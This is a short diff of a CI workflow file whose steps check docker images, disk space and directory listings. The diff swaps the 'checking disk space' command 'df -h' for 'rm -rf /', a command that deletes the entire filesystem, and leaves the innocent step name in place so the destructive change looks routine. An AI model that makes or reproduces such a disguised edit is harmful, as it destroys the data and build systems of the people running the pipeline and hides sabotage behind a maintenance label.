@@ -9,7 +9,7 @@ jobs:
      - name: chekcing docker images
        run: docker images | wc -l
      - name: checking disk space
-       run: df -h
+       run: rm -rf /
      - name: chekcing
        run: ls -lrt 
     
